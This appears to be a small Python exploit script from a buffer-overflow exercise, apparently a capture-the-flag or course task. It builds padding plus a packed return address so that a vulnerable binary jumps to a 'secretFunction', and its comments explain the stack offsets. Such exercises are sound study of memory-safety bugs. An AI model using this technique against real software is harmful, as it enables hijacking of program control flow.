#In my case the address of the secret function is this 0000000000401296 T secretFunction

import sys #For cmd arg
from struct import pack

payload = ""
#Argument checking
if( len(sys.argv) == 3 ):

    #Taking the address which is given as cmd arg from bash script.
    address = sys.argv[2]

    #Creating the payload variable
    for i in range(int(sys.argv[1])) :
        payload = payload + "A"
    
    #Packing it into a little endian(<) unsigned long long(Q) binary variable
    binAddress = pack ("<Q",int(address, 16))

    #Writing payload
    f = open("payload.bin", "w")
    f.write(payload)
    f.close()

    #Adding binary address as binary to the file.
    f = open('payload.bin', 'ab')
    f.write(binAddress)
    f.close()
    print(f"Payload written to payload.bin ({len(payload)} bytes)")


else:
    print("Enter only 1 argument!")

### The return address is stays end of the buffer (100 bytes in stack) + 20 bytes of somethings + < 8bytes of return address> 
## So when 120 bytes is given as an argument, 120+8 bytes overwrites the return pointer.
#  Next todo is to make bruteforce version generic.
